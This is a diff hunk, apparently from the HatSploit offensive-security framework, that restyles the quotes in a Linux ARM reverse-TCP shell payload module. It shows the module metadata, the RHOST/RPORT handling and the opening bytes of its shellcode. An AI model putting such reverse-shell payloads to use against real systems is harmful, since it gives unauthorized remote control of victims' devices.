@@ -9,19 +9,19 @@ from pex.socket import Socket
 
 class HatSploitPayload(Payload, Socket):
     details = {
-        'Name': "Linux armle Shell Reverse TCP",
-        'Payload': "linux/armle/shell_reverse_tcp",
-        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
-        'Description': "Shell reverse TCP payload for Linux armle.",
-        'Architecture': "armle",
-        'Platform': "linux",
-        'Rank': "high",
-        'Type': "reverse_tcp",
+        "Name": "Linux armle Shell Reverse TCP",
+        "Payload": "linux/armle/shell_reverse_tcp",
+        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
+        "Description": "Shell reverse TCP payload for Linux armle.",
+        "Architecture": "armle",
+        "Platform": "linux",
+        "Rank": "high",
+        "Type": "reverse_tcp",
     }
 
     def run(self):
-        remote_host = self.pack_host(self.handler['RHOST'])
-        remote_port = self.pack_port(self.handler['RPORT'])
+        remote_host = self.pack_host(self.handler["RHOST"])
+        remote_port = self.pack_port(self.handler["RPORT"])
 
         return (
             b"\x01\x10\x8F\xE2"
